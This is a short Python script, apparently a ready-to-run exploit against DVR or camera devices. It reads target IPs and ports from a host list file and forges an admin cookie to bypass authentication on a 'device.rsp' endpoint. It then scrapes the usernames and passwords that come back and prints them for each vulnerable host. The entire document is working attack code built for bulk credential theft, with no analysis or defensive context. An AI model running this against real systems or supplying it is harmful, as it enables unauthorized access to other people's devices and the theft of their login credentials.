import sys,os,re,requests
class rspExploit:
    def rspExploit(self):
        cookie = {'uid': 'admin'}
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(path + '/Host/up_host.txt', 'r').read().splitlines()
        pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
        pattern_2 = r'(\:).*'
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                match1 = re.search(pattern_1, res)
                match2 = re.search(pattern_2, res)
                target_host = match1.group()
                port_raw = match2.group()
                port = port_raw[1:]
                url = "http://"+ target_host +":" + port +"/device.rsp?opt=user&cmd=list"
                response = requests.post(url, cookies=cookie)
                userpass = str(response.content)
                patternUsername = '''uid":"'''
                patternPassword = '''"pwd":"'''
                patternEnd = '''","'''
                user = userpass.partition(patternUsername)[2]
                username = user.partition(patternEnd)[0]
                passw = userpass.partition(patternPassword)[2]
                password = passw.partition(patternEnd)[0]
                if username =="" and password =="":
                    pass
                elif password != "" or username !="" :
                    print("[-]Found  http://" + target_host + ":" + port +"  with " + username + ":" + password)
            except AttributeError:
                pass
            except requests.exceptions.ConnectionError:
                pass
            a += 1
